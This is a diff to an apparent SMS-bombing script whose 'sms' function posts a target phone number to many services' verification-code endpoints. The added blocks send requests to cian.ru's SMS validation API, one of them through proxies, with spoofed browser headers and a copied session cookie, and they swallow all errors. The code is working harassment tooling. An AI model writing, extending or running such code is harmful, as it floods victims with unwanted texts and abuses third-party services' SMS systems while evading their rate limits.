@@ -143,6 +143,33 @@ def sms(prx, number, tm, code):
 
 				try:
 					header = {
+						"accept": "*/*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "50",
+						"content-type": "application/json",
+						"cookie": "_CIAN_GK=35623ab7-31ae-4524-8379-ef03f9f0661c; __cf_bm=p3B1ya.PygUgnn3aQI7BUJEWsmnn4W01olCIiTfid_U-1643674665-0-AVGXby66id6I6s08mV4f6zJj0/Y7w3S0cLCbvGir2C9WsDqcilwUjDgYzy9yxBc/6kAEgV8LS86Lq1+CJ70x01k=; adb=1; login_mro_popup=1; sopr_utm=%7B%22utm_source%22%3A+%22yandex%22%2C+%22utm_medium%22%3A+%22organic%22%7D; sopr_session=352677dc85054607; cookie_agreement_accepted=1",
+						"dnt": "1",
+						"origin": "https://spb.cian.ru",
+						"referer": "https://spb.cian.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-site",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+
+					payload = {"phone":"+"+number,"type":"authenticateCode"}
+
+					requests.post("https://ud-api.cian.ru/sms/v2/send-validation-code/", json=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
+					header = {
 						"Accept": "application/json, text/plain, */*",
 						"Accept-Language": "en-US,en;q=0.9,uk;q=0.8,ru;q=0.7",
 						"app_uid": "d6cc9ca7-2d16-4a82-be61-96a1a7b3f4ba",
@@ -1291,6 +1318,33 @@ def sms(prx, number, tm, code):
 						"phone": number
 					}
 					requests.post("https://auth.easypay.ua/api/check", json = payload)
+				except:
+					pass
+
+				try:
+					header = {
+						"accept": "*/*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "50",
+						"content-type": "application/json",
+						"cookie": "_CIAN_GK=35623ab7-31ae-4524-8379-ef03f9f0661c; __cf_bm=p3B1ya.PygUgnn3aQI7BUJEWsmnn4W01olCIiTfid_U-1643674665-0-AVGXby66id6I6s08mV4f6zJj0/Y7w3S0cLCbvGir2C9WsDqcilwUjDgYzy9yxBc/6kAEgV8LS86Lq1+CJ70x01k=; adb=1; login_mro_popup=1; sopr_utm=%7B%22utm_source%22%3A+%22yandex%22%2C+%22utm_medium%22%3A+%22organic%22%7D; sopr_session=352677dc85054607; cookie_agreement_accepted=1",
+						"dnt": "1",
+						"origin": "https://spb.cian.ru",
+						"referer": "https://spb.cian.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-site",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+
+					payload = {"phone":"+"+number,"type":"authenticateCode"}
+					
+					requests.post("https://ud-api.cian.ru/sms/v2/send-validation-code/", json=payload, headers=header)
 				except:
 					pass
 
